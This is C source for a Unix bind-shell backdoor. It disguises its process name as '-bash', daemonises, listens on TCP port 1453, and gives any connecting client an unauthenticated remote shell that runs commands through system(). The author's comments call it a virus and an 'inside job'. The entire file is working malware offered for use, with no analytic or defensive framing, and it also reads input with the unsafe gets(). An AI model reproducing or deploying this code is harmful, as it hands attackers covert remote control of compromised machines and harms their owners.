#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <signal.h>

command(str) const char * str; {
    if (!strcmp(str, "exit"))
        exit(0);
    else if (!strncmp(str, "cd ", 3)) {
        if (chdir(str+3) < 0)
            return 1;
    } else system(str);
    return 0;
}

forkpid() {
    int pid;
    signal(SIGCHLD,SIG_IGN);
    pid = fork();
    if (pid > 0) {
        sleep(1);
        exit(EXIT_SUCCESS);
    }
    if (!pid) {
        signal(SIGCHLD,SIG_DFL);
        return getpid();
    }
    return -1;
}

main (argc, argv) char * argv[]; {
    int socketfd, socketfd2, size;
    struct sockaddr_in local, remote;
    char cmd[256];
    strcpy (argv[0], "-bash");
    signal (SIGCHLD, SIG_IGN);
    bzero (&local, sizeof(local));
    local.sin_family = AF_INET;
    local.sin_port = htons (1453); /* Inside job */
    local.sin_addr.s_addr = INADDR_ANY;
    bzero (&(local.sin_zero), 8);
    if ((socketfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        exit(1);
    if (bind (socketfd, (struct sockaddr *)&local, sizeof(struct sockaddr)) == -1)
        exit(1);
    if (listen(socketfd, 5) == -1)
        exit(1);
    size = sizeof(struct sockaddr_in);
    forkpid();
    while (1) {
        if ((socketfd2 = accept (socketfd, (struct sockaddr *)&remote, &size)) == -1)
            exit(1);
        if (!fork ())
            getshell(socketfd2, socketfd);
        else {
            signal (SIGCHLD, SIG_IGN);
            close(socketfd2);
        }
    }
    close (socketfd2);
    exit(0);
}

getshell(socketfd2, socketfd) {
    char a[1024], b[1024];
    close(0);
    close(1);
    close(2);
    dup2(socketfd2, 0);
    dup2(socketfd2, 1);
    dup2(socketfd2, 2);
    for (;;) {
        printf(" REMOTE $ ");
        gets(b); /* Do we care about safeness while creating viruses? */
        b[strlen(b) -1] = '\0';
        command(b,socketfd2);
        fflush(stdout);
    }
    return 0;
}
